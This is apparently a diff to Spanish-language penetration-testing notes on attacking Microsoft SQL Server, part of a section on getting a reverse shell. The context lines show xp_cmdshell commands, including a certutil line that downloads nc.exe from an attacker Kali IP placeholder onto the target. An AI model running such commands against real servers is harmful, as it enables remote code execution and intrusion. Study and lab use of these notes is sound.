@@ -118,7 +118,7 @@ Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion
 # Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
 ```
 
-### OBTENER REVERSE SHELL (DESDE FUERA)
+### 4a. OBTENER REVERSE SHELL (DESDE FUERA)
 
 ```bash
 # Insight:
@@ -154,7 +154,7 @@ Paso 4:
 # REVERSHELL
 Paso 1:
 # Crear directorio temporal si no existe
-❯ xp_cmdshell "mkdir C:\temp"
+❯ xp_cmdshell "mkdir C:\Temp"
 
 # Paso 2 → Descargar nc.exe desde Kali
 ❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc.exe C:\temp\nc.exe'
